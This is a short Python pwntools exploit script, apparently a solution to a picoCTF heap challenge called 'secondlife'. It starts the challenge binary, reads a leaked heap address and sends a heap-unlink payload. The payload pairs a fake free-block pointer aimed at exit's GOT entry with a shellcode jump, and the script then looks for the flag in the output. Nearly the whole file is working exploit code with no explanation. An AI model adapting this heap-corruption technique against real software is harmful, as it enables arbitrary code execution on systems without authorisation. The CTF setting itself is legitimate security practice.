from pwn import *
import sys
import string

DEBUG = True

context.binary='/problems/secondlife_3_d2e0c7e84bcd27965cec7710051e6a0b/vuln'
context.terminal=['tmux', 'splitw', '-v']
def start():
    global sh
    stdout = process.PTY
    stdin = process.PTY
    sh = process('/problems/secondlife_3_d2e0c7e84bcd27965cec7710051e6a0b/vuln', stdin=stdin, stdout=stdout)


exit_got = p32(0x0804d02c - 12) #sets this as if exit got was the next addr in a freeblock
def test(guess):
    start()
    sh.recvuntil('decimal...\n')
    first_addr_str = sh.recvline()
    first_addr = int(first_addr_str)
    print first_addr
    print sh.sendline('A')
    print sh.sendlineafter('useful...', exit_got+p32(first_addr+8)+asm('nop; '*7+'push 0x41414141; push 0x8048956; ret'))
    output = sh.recvall()
    print output
    if 'pico' in output:
        print output
        return True
    else:
        return False

test(None)
#print payload1 + '\n' + payload2
#while not test(None)
